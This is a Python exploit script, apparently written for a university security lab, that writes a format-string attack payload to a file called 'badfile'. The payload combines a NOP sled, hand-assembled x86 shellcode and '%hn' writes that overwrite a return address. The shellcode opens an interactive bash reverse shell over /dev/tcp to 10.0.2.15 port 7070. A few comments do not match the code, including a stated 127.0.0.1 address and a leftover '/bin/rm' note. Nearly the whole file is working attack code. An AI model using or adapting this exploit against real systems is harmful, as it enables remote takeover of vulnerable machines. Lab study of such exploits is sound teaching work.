#!/usr/bin/python3
import sys

# This shellcode creates a local shell
local_shellcode = ("\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
                   "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
                   "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00").encode('latin-1')

# Run /bin/bash -i > /dev/tcp/127.0.0.1/7070 0<&1 2>&1"

malicious_code = (# Push the command '/bin////bash' into stack (//// is equivalent to /)
        "\x31\xc0"  # xorl %eax,%eax
        "\x50"  # pushl %eax
        "\x68""bash"  # pushl "bash"
        "\x68""////"  # pushl "////"
        "\x68""/bin"  # pushl "/bin"
        "\x89\xe3"  # movl %esp, %ebx  

        # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
        "\x31\xc0"  # xorl %eax,%eax
        "\x50"  # pushl %eax
        "\x68""-ccc"  # pushl "-ccc"
        "\x89\xe0"  # movl %esp, %eax

        # Push the 2nd argument into the stack:
        #       '/bin/rm /tmp/myfile' 
        # Students need to use their own VM's IP address
        "\x31\xd2"  # xorl %edx,%edx
        "\x52"  # pushl %edx
        "\x68""    "
        "\x68""2>&1"
        "\x68""<&1 "
        "\x68""70 0"
        "\x68""5/70"
        "\x68"".2.1"
        "\x68""10.0"
        "\x68""tcp/"
        "\x68""dev/"
        "\x68"" > /"
        "\x68""  -i"
        "\x68""bash"
        "\x68""////"
        "\x68""/bin"
        "\x89\xe2"  # movl %esp,%edx

        # Construct the argv[] array and set ecx
        "\x31\xc9"  # xorl %ecx,%ecx
        "\x51"  # pushl %ecx
        "\x52"  # pushl %edx
        "\x50"  # pushl %eax
        "\x53"  # pushl %ebx
        "\x89\xe1"  # movl %esp,%ecx  

        # Set edx to 0
        "\x31\xd2"  # xorl %edx,%edx   

        # Invoke the system call
        "\x31\xc0"  # xorl %eax,%eax
        "\xb0\x0b"  # movb $0x0b,%al 
        "\xcd\x80"  # int $0x80
        ).encode('latin-1')

N = 400
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the code at the end
start = N - len(malicious_code)
content[start:] = malicious_code

ret_addr = 0xbffff038 + 4
str_addr = 0xbffff0e0 + 100  # the length of format string <= 100, it will jump to a NOP then to malicious code
content[:4] = (ret_addr).to_bytes(4, byteorder='little')
content[4:8] = (ret_addr + 2).to_bytes(4, byteorder='little')
higher, lower = divmod(str_addr, 0x10000)
lower = (lower - 8) % (0x10000)
higher = (higher - lower - 8) % (0x10000)
s = "%" + str(lower) + "x%80$hn%" + str(higher) + "x%81$hn"
fmt = s.encode('latin-1')
content[8:8 + len(fmt)] = fmt
# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()